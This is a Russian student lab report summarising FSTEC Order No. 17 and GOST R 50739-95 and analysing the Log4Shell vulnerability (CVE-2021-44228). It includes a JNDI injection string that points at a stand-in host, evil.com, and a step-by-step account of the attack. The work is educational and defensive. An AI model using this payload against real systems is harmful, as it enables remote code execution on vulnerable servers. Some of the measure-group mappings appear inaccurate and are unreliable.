ПР №2. Нормативная база и анализ CVE

1. Нормативные документы

ГОСТ Р 50739-95
----------------
Область применения: средства вычислительной техники, защита от несанкционированного доступа.

Количество классов защищённости: 3 класса (1 – наивысший, 3 – низший).

Что регулирует управление доступом: идентификацию, проверку подлинности, разграничение доступа к объектам, регистрацию событий.

Приказ ФСТЭК №17
-----------------
Кому адресован: государственные информационные системы (ГИС).

Группа мер УПД (управление правами доступа) включает:
- управление учётными записями (создание, блокирование, удаление);
- назначение прав доступа по принципу минимальной необходимости;
- контроль полномочий при изменении ролей;
- мониторинг событий доступа.

2. Анализ уязвимости

CVE-идентификатор: CVE-2021-44228
CVSS Score: 10.0 (Критический)
Затронутый продукт: Apache Log4j 2.0 – 2.14.1 (библиотека логирования для Java)

Описание
---------
Log4Shell – уязвимость удалённого выполнения кода (RCE). Злоумышленник может передать приложению специальную строку вида ${jndi:ldap://evil.com/exploit}. Библиотека Log4j подставляет значение через JNDI и загружает произвольный Java-код с внешнего сервера.

Механизм атаки
---------------
1. Злоумышленник отправляет HTTP-заголовок, параметр или поле формы, содержащее вредоносную строку.
2. Log4j логирует эту строку.
3. Log4j выполняет JNDI-запрос к указанному LDAP-серверу.
4. Сервер злоумышленника возвращает Java-класс с эксплойтом.
5. Приложение загружает и выполняет этот класс.

Аутентификация не требуется. Attack Vector = Network, Privileges Required = None.

Ущерб:
- Конфиденциальность: кража данных, чтение файлов.
- Целостность: изменение/удаление данных.
- Доступность: возможен отказ в обслуживании.

Применимые меры защиты по Приказу ФСТЭК №17
--------------------------------------------

Группа мер    | Мера                      | Как помогает
--------------|---------------------------|--------------------------------------------
ОПС           | Управление обновлениями ПО | Установка патча устраняет уязвимость.
ЗИС           | Контроль входных данных    | Фильтрация строк (WAF, валидация).
ИАФ           | Идентификация/аутентификация | Ограничивает зону поражения.
УПД           | Минимизация прав           | Даже при эксплуатации снижает ущерб.

3. Выводы
----------
- Уязвимости уровня CVSS 10.0 (Log4Shell) требуют немедленного реагирования.
- Нормативные документы (Приказ ФСТЭК №17) указывают на необходимость управления обновлениями (группа ОПС) и контроля ввода (ЗИС).
- Без применения этих мер даже современное ПО остаётся уязвимым.
- База CVE и CVSS позволяют объективно оценить критичность.

4. Контрольные вопросы (письменные ответы)
-------------------------------------------
1. CVSS – шкала оценки критичности уязвимостей от 0 до 10. Критические: 9.0–10.0.
2. Приказ ФСТЭК №17 – для ГИС, №21 – для ИСПДн.
3. Вектор атаки – показывает путь эксплуатации: Network, Adjacent, Local, Physical.
4. Уязвимость с CVSS 10.0 может быть не самой срочной из-за компенсирующих мер (изоляция, настройки).
5. Группа мер ОПС (обеспечение безопасности программ).
